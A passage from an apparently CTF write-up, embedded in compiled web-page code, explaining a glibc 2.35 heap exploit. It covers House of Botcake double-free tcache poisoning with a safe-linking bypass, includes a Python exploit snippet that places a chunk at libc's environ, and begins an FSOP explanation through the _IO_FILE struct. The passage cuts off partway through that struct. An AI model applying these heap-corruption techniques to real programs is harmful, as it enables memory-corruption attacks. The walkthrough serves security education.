there\\u2019s a couple things in place that prevent me from trying simpler exploits.\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"Full RELRO is enabled, so I cannot overwrite \",(0,n.jsx)(e.code,{children:\"GOT\"}),\" to make libc funcs do something else...\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"glibc 2.35 removed \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" and \",(0,n.jsx)(e.code,{children:\"__malloc_hook\"}),\", \",(0,n.jsx)(e.em,{children:\"and\"}),\" I don\\u2019t have a one gadget available due to seccomp...\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Even writing to \",(0,n.jsx)(e.code,{children:\"__exit_funcs\"}),\" isn\\u2019t an option. This is different alternative to the \",(0,n.jsx)(e.code,{children:\"hooks\"}),\", as this is a function table of exit handlers when \",(0,n.jsx)(e.code,{children:\"exit()\"}),\" is called through libc. But this specific program uses \",(0,n.jsx)(e.code,{children:\"_exit()\"}),\" which does \",(0,n.jsx)(e.em,{children:\"not\"}),\" call any exit handlers... \",(0,n.jsx)(e.em,{children:\"and\"}),\" again, seccomp.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Unfortunately, this means I need one more leak: The stack. I need to be able to write to the return address of the stack frame to hijack control of the problem. The usual route is a symbol in libc called \",(0,n.jsx)(e.code,{children:\"environ\"}),\", which stores the address to a position on the stack where the \",(0,n.jsx)(e.code,{children:\"envp\"}),\" array is held. Astute readers will notice the problem with just doing this alone, but lets continue with this route anyway:\"]}),`\n`,(0,n.jsxs)(e.p,{children:['We need to get a chunk to exist in libc, rather than the heap. This is the primary goal of most heap pwn, as depending on the program gives you \"read what where\" or \"write what where\" primitives anywhere in program memory. There is an excellent repository called ',(0,n.jsx)(e.a,{href:\"https://github.com/shellphish/how2heap/tree/master\",children:\"how2heap\"}),\" which contains tons of POCs for various heap exploits for many versions of glibc. The primative that I\\u2019ll be using, which achieves what I need is called \",(0,n.jsx)(e.a,{href:\"https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c\",children:\"House of Botcake\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"House of Botcake uses a double free bug to confuse malloc and allow use to return a chunk from an arbitrary location. \",(0,n.jsx)(e.code,{children:\"free()\"}),\" can\\u2019t search through the entire heap each time to check whether a chunk is actually free, nor can it always trust the in-use bit, as not every structure on the heap (notably, tcaches) update and respond to the in-use bit. There are some basic detections (like making sure free isn\\u2019t called twice in a row on the same block), but it\\u2019s easily defeated by just freeing another block in between.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"House of Botcake abuses this double free to make a chunk that is part of a consolidated chunk \",(0,n.jsx)(e.em,{children:\"and\"}),\" in the tcache at the same time. I followed \",(0,n.jsx)(e.a,{href:\"https://ret2school.github.io/post/catastrophe/\",children:\"this writeup\"}),\" for both botcake usage and a later exploit we need to do:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:\"First, we allocate 7 0x200 sized blocks, this will fill the tcache for 0x200 and makes any other frees end up in a different bin.\"}),`\n`,(0,n.jsx)(e.li,{children:\"Then, we allocate a previous chunk, and our victim chunk, each of size 0x200.\"}),`\n`,(0,n.jsx)(e.li,{children:\"We\\u2019ll allocate a 16 byte chunk to prevent any further consolidation past our victim chunk\"}),`\n`,(0,n.jsx)(e.li,{children:\"We free those 7 original chunks to actually fill the tcache.\"}),`\n`,(0,n.jsx)(e.li,{children:\"We free our victim chunk, it ends up in the unsorted bin, since its too large for any other bin.\"}),`\n`,(0,n.jsx)(e.li,{children:\"We free our previous chunk, because malloc now sees two large, adjacent chunks, it consoldates them and places a 0x421 size block into the unsorted bin. (malloc automatically allocs 16 bytes more than what we ask, and uses the last byte as a flag, so this is the result of 2 0x210 chunks)\"}),`\n`,(0,n.jsxs)(e.li,{children:[\"We free our victim chunk \",(0,n.jsx)(e.em,{children:\"again\"}),\". This bypasses the naive double free exception, and since our victim chunk has the info for a 0x210 byte block, it gets placed into the tcache (uh oh).\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Now, we alloc a 0x230 sized chunk. Why? Because malloc will split the unsorted block into two, giving us the 0x230 block... but this contains the metadata of our victim chunk, which we now have write control over \",(0,n.jsx)(e.em,{children:\"during\"}),\" our allocation.\"]}),`\n`,(0,n.jsx)(e.li,{children:\"When we now alloc a 0x200 block, we\\u2019ll get the victim chunk, but then the next address that the tcache is pointed to is any address of our choosing!\"}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"The exact payload we provide our \",(0,n.jsx)(e.code,{children:\"0x230\"}),\" chunk is explained below, and the complete code for this is as follows:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Get our environment target!\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"symbols\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'environ'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Allocate 7 blocks of size 0x200, we\\u2019ll free them later\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We can\\u2019t leak them as before, so place them into our mem array properly\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Allocate our prev block and our victim block, along with the buffer\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"6\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'prev'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'victim'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'hello!'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Fill the tcache!\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our victim chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our previous chunk (they are now consolidated)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"6\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'X'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Open up a slot in the tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# double free vulnerablity, now victim is in the tcache!\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We alloc the slightly larger chunk, getting a split of the [prev, victim] chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We\\u2019re going to write to it the necessary padding then:\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# 0x211, to preserve the size of the victim chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# environ ^ ((heap + 0x3320) >> 12), because we need to pass a safe-linked ptr.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Otherwise, malloc will crash. 0x3320 offset was found via debugging.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x230\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'T'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x208\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x211\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x3320\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'X'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# remove a from the tcache again, updating the linked list structure\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"''\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# this guy is now located at environ!\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Ah, but we run into a slight issue. I \",(0,n.jsx)(e.em,{children:\"have\"}),\" to send a payload, and sending a newline clobbers the address stored by \",(0,n.jsx)(e.code,{children:\"environ\"}),\". So I need write somewhere that would somehow leak environ for me! There is a method to do this: File Structure Oriented Programming.\"]}),`\n`,(0,n.jsxs)(e.h2,{id:\"rop-i-like-fsop-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#rop-i-like-fsop-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"ROP? I Like FSOP. \",(0,n.jsx)(\"a\",{name:\"fsop\"})]}),`\n`,(0,n.jsxs)(e.p,{children:[\"I\\u2019m going to be honest, when I did this challenge during the CTF, I just saw the line of code that would work for me in the \",(0,n.jsx)(e.a,{href:\"https://ret2school.github.io/post/catastrophe/\",children:\"ret2school\"}),\" writeup and copied it. However, I feel that it would be wrong for me to not even try to explain this technique.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"If you have ever used pure \",(0,n.jsx)(e.code,{children:\"open, read, write\"}),\" syscalls, you\\u2019ll be quite familiar interacting with \",(0,n.jsx)(e.em,{children:\"file descriptors\"}),'. These are just integer indexes that correspond to a file currently accessible by your program. Traditionally, 0,1,2 are reserved for the linux \"files\" stdin, stdout, and stderr, which is how you interact with you program. Now, using ',(0,n.jsx)(e.code,{children:\"OWR\"}),\" syscalls can be tedious to use, and libc has provided more feature-rich versions, such as \",(0,n.jsx)(e.code,{children:\"fopen, fprintf, fputc\"}),\", etc. These don\\u2019t use just file descriptors though, instead using a \",(0,n.jsx)(e.code,{children:\"FILE\"}),\" struct, referenced by pointer. Let\\u2019s look at the relevant definition, using \",(0,n.jsx)(e.a,{href:\"https://elixir.bootlin.com/\",children:\"exlir.bootlin.com\"}),\", truncated slightly:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_FILE\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" _flags\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* High-order word is _IO_MAGIC; rest is flags. */\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* The following pointers correspond to the C++ streambuf protocol. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_read_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Current read pointer */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_read_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* End of get area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_read_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Start of putback+get area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Start of put area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Current put pointer. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_write_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* End of put area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Start of reserve area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_buf_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* End of reserve area. */\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* The following fields are used to support backing up and undo. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_save_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Pointer to start of non-current get area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_backup_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Pointer to first valid character of backup area */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_save_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Pointer to end of non-current get area. */\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_marker\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_markers\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_FILE\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_chain\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" _fileno\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" _flags2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  __off_t _old_offset\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* This used to be _offset but it\\u2019s too small.  */\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* 1+column number of pbase(); 0 is unknown. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"unsigned\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"short\"}),\" _cur_column\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"signed\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" _vtable_offset\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" _shortbuf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  _IO_lock_t \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_lock\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  __off64_t _offset\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Wide character stream stuff.  */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_codecvt\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_codecvt\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_wide_data\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_wide_data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_FILE\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_freeres_list\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"void\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_freeres_buf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token 